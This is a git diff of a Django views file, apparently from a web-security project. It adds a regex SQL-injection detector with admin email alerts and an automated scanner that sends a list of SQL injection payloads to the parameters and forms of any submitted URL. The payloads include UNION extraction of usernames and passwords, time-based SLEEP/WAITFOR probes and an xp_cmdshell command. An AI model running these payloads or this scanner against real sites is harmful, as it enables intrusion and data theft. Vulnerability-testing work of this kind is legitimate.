@@ -23,7 +23,6 @@ def index(request):
     return render(request,'user/index.html')
 
 
-
 def about(request):
     return render(request,'user/about.html')
 
@@ -102,8 +101,23 @@ def otp(request):
 def services(request):
     return render(request,'user/service.html')
 
+from django.shortcuts import render, redirect
+from django.contrib import messages
+from django.http import HttpResponseBadRequest
+import logging
+
+logger = logging.getLogger('django')
 
 def user_login(request):
+    # Detect any SQL injection attempts in the request
+    suspicious_found, attack_details = sql_injection(request)
+
+    if suspicious_found:
+        # Log the suspicious activity
+        logger.warning(f"Suspicious request detected: {attack_details}")
+        send_email_alert(attack_details)  # Send alert email to admin
+        return HttpResponseBadRequest("Suspicious request detected")
+
     if request.method == 'POST':
         email = request.POST.get('email')
         password = request.POST.get('password')
@@ -115,7 +129,7 @@ def user_login(request):
                     messages.success(request, 'Login Successful')
                     return redirect('user_dashboard')
                 elif user.status == 'Pending':
-                    messages.info(request, 'Otp verification is compalsary otp is sent to ' + str(user.user_email))
+                    messages.info(request, f'Otp verification is compulsory. OTP is sent to {user.user_email}')
                     return redirect('otp')
                 else:
                     messages.error(request, 'Your account is not approved yet.')
@@ -126,7 +140,8 @@ def user_login(request):
         except User.DoesNotExist:
             messages.error(request, 'Invalid Login Details')
             return redirect('user_login')
-    return render(request,'user/user-login.html')
+
+    return render(request, 'user/user-login.html')
 
 from .models import CyberSecurityPrediction
 
@@ -345,3 +360,254 @@ def feedback(request):
 
     return render(request, "user/feedback.html")
 
+
+
+from bs4 import BeautifulSoup
+from urllib.parse import urlparse, urljoin, urlencode
+from tqdm import tqdm
+import time
+import requests
+
+sql_payloads = [
+    "'", 
+    "' OR '1'='1", 
+    "' OR '1'='1' --",  # SQLite-compatible tautology
+    "' OR 1=1--",       # Alternative syntax
+    "' OR 1=1#",       # MySQL-specific (for comparison)
+    "admin' --", 
+    "admin' #", 
+    "' OR SLEEP(5) --", 
+    "' OR IF(1=1, SLEEP(5), 0) --", 
+    "' UNION SELECT NULL, @@version, NULL --", 
+    "' OR 1=1 AND SUBSTRING((SELECT @@version), 1, 1) = '5' --", 
+    "' UNION SELECT NULL, version(), NULL --", 
+    "' OR 1=1 AND (SELECT LENGTH(current_database())) > 0 --", 
+    "'; WAITFOR DELAY '0:0:5' --", 
+    "' UNION SELECT NULL, @@version, NULL --", 
+    "'; EXEC xp_cmdshell('whoami') --", 
+    "' UNION SELECT NULL, banner, NULL FROM v$version --", 
+    "' OR 1=1 AND (SELECT COUNT(*) FROM all_users) > 0 --",
+    "' AND ASCII(SUBSTRING((SELECT @@version), 1, 1)) > 114 --",
+    "' AND 1=(SELECT COUNT(*) FROM tablenames); --",
+    "'; WAITFOR DELAY '0:0:10' --",
+    "' OR 'x'='x' AND 1=(SELECT 1 FROM dual WHERE database() LIKE '%') --",
+    "' OR 'x'='x' AND version() LIKE '% --",
+    "' OR 'x'='x' AND MID(version(), 1, 1) = '5' --",
+    "' AND 'x'='y' AND (SELECT LENGTH(version())) > 0 --",
+    "' AND 1=2 UNION SELECT 1, version(), database() --",
+    "' AND 1=2 UNION SELECT 1, user(), database() --",
+    "1' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT IFNULL(CAST(database() AS NCHAR),0x20)),1,1))>64) THEN 0x31 ELSE 0x30 END)) AND '1'='1",
+    "' AND 1=2 UNION SELECT ALL 1,2,3,4,5,6,name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename')--",
+    "' AND 1=2 UNION SELECT ALL 1,2,3,4,5,6,7 FROM sysobjects WHERE xtype = 'U' --",
+    # SQLite-specific payloads
+    "' OR 1=1 --",  # The working payload you tested
+    "' OR 1=1 AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='users') > 0 --",  # Table existence check
+    "' UNION SELECT username, password FROM users --",  # Data extraction (from previous suggestion)
+    "' OR ''='' --",  # Another simple tautology for SQLite
+]
+
+# Default error indicators (unchanged)
+default_error_indicators = [
+    "syntax", "error", "warning", "mysql", "sql", "select", 
+    "database", "version", "column", "table", "postgres", "microsoft", "oracle"
+]
+
+# Function to test URL with payloads (unchanged)
+def test_url(url, payloads, error_indicators, method='GET', data=None, timeout=10, verbosity=0):
+    result = ""
+    seen_vulns = set()
+    base_url = url.split('?')[0]
+
+    for payload in tqdm(payloads, desc="Testing payloads", unit="payload"):
+        if method == 'GET':
+            test_url = f"{base_url}?test={urlencode({'': payload})[1:]}"
+            try:
+                start_time = time.time()
+                response = requests.get(test_url, timeout=timeout)
+                elapsed = time.time() - start_time
+            except requests.RequestException as e:
+                result += f"Request failed for GET: {e}\n"
+                continue
+        else:  # POST
+            for key in data:
+                modified_data = data.copy()
+                modified_data[key] = payload
+                try:
+                    start_time = time.time()
+                    response = requests.post(url, data=modified_data, timeout=timeout)
+                    elapsed = time.time() - start_time
+                except requests.RequestException as e:
+                    result += f"Request failed for POST (field: {key}): {e}\n"
+                    continue
+
+                vuln_key = (method, url, key, payload)
+                if vuln_key in seen_vulns:
+                    continue
+
+                is_vulnerable = False
+                for indicator in error_indicators:
+                    if indicator in response.text.lower():
+                        is_vulnerable = True
+                        break
+                if "SLEEP" in payload or "WAITFOR" in payload:
+                    if elapsed > 4:
+                        is_vulnerable = True
+
+                if is_vulnerable:
+                    seen_vulns.add(vuln_key)
+                    result += f"[!] Vulnerable {method} parameter detected at: {url}\n"
+                    result += f"    Field: {key}\n"
+                    result += f"    Payload: {payload}\n"
+                    result += f"    Response time: {elapsed:.2f}s\n" if "SLEEP" in payload or "WAITFOR" in payload else ""
+
+        if method == 'GET':
+            vuln_key = (method, url, "test", payload)
+            if vuln_key in seen_vulns:
+                continue
+
+            is_vulnerable = False
+            for indicator in error_indicators:
+                if indicator in response.text.lower():
+                    is_vulnerable = True
+                    break
+            if "SLEEP" in payload or "WAITFOR" in payload:
+                if elapsed > 4:
+                    is_vulnerable = True
+
+            if is_vulnerable:
+                seen_vulns.add(vuln_key)
+                result += f"[!] Vulnerable GET parameter detected at: {url}\n"
+                result += f"    Payload: {payload}\n"
+                result += f"    Response time: {elapsed:.2f}s\n" if "SLEEP" in payload or "WAITFOR" in payload else ""
+
+        time.sleep(0.5)
+
+    return result
+
+# Function to test SQL Injection in form fields (unchanged)
+def test_forms(url, payloads, error_indicators, timeout, verbosity):
+    result = ""
+    try:
+        response = requests.get(url, timeout=timeout)
+    except requests.RequestException as e:
+        return f"Failed to fetch page: {e}\n"
+
+    soup = BeautifulSoup(response.text, 'html.parser')
+    forms = soup.find_all('form')
+    if not forms:
+        result += "No forms found on the page.\n"
+
+    for form in tqdm(forms, desc="Testing forms", unit="form"):
+        action = form.get('action')
+        method = form.get('method', 'get').upper()
+        action_url = urljoin(url, action)
+        inputs = form.find_all('input')
+        form_data = {input.get('name'): "test" for input in inputs if input.get('name') and input.get('type') != 'submit'}
+
+        if not form_data:
+            result += f"No usable input fields in form at {action_url}\n"
+            continue
+
+        result += f"Testing form at {action_url} with method {method}:\n"
+        form_result = test_url(action_url, payloads, error_indicators, method=method, data=form_data, timeout=timeout, verbosity=verbosity)
+        result += form_result
+
+    return result
+
+# Main function to run the SQL injection checks (unchanged)
+def detect_sql_injection(url):
+    result = f"Checking for SQL Injection vulnerabilities at {url} on {time.strftime('%Y-%m-%d %H:%M:%S')}...\n"
+
+    result += "Checking URL parameters for SQL injection:\n"
+    result += test_url(url, sql_payloads, default_error_indicators, timeout=10, verbosity=1)
+
+    result += "\nChecking forms for SQL injection:\n"
+    result += test_forms(url, sql_payloads, default_error_indicators, timeout=10, verbosity=1)
+
+    return result
+
+# Django views (unchanged)
+def sqlinjection(request):
+    return render(request, "user/sqlinjection.html")
+
+def check_sql_injection(request):
+    if request.method == 'POST':
+        website_url = request.POST.get('website_url')
+        
+        if website_url:
+            result = detect_sql_injection(website_url)
+            return render(request, 'user/sqlinjection.html', {'result': result})
+    
+    return render(request, 'user/sqlinjection.html')
+
+import logging
+import re
+from django.http import HttpResponseBadRequest
+from django.utils.timezone import now
+
+# Get the logger
+logger = logging.getLogger('django')
+
+# Define patterns that are commonly used in SQL Injection attacks
+SQL_INJECTION_PATTERNS = [
+    r"(\%27)|(\')|(\-\-)|(\%23)|(#)",  # Detects single quotes, comments
+    r"select.*from.*information_schema.tables",  # Detects SQL SELECT statements
+    r"drop.*table",  # Detects DROP table statements
+    r"union.*select.*from",  # Detects UNION SELECT statements
+    r"or.*1=1",  # Detects OR 1=1 (always true)
+    r"update.*set",  # Detects UPDATE statements
+]
+
+logger = logging.getLogger('django')
+# Function to detect SQL Injection in request data
+SQL_INJECTION_PATTERNS = [
+    r"select.*from.*information_schema.tables",  # Detects SQL SELECT statements
+    r"drop.*table",  # Detects DROP table statements
+    r"union.*select.*from",  # Detects UNION SELECT statements
+    r"or.*1=1",  # Detects OR 1=1 (always true)
+    r"update.*set",  # Detects UPDATE statements
+]
+
+# Function to detect SQL Injection in request data
+def sql_injection(request):
+    suspicious_found = False
+    attack_details = []
+
+  
+
+    # Check request parameters (GET, POST, etc.)
+    for param, value in request.GET.items():
+        # Skip certain parameters (like email, password)
+       
+        if any(re.search(pattern, value, re.IGNORECASE) for pattern in SQL_INJECTION_PATTERNS):
+            suspicious_found = True
+            attack_details.append(f"Suspicious query parameter: {param} = {value}")
+
+    for param, value in request.POST.items():
+        # Skip certain parameters (like email, password)
+        
+        if any(re.search(pattern, value, re.IGNORECASE) for pattern in SQL_INJECTION_PATTERNS):
+            suspicious_found = True
+            attack_details.append(f"Suspicious POST parameter: {param} = {value}")
+
+    # Check request headers for suspicious patterns (common in headers such as 'User-Agent', 'Referer', etc.)
+    for header, value in request.headers.items():
+        if any(re.search(pattern, value, re.IGNORECASE) for pattern in SQL_INJECTION_PATTERNS):
+            suspicious_found = True
+            attack_details.append(f"Suspicious header: {header} = {value}")
+
+    return suspicious_found, attack_details
+
+
+from django.core.mail import send_mail
+from django.conf import settings
+
+
+def send_email_alert(details):
+    subject = 'Potential SQL Injection Attempt Detected'
+    message = f'An attempt to inject SQL was detected on your website. Details:\n\n{details}'
+    from_email = settings.DEFAULT_FROM_EMAIL
+    to_email = [settings.ADMIN_EMAIL]  # Admin email defined in settings.py
+
+    # Send the email
+    send_mail(subject, message, from_email, to_email)
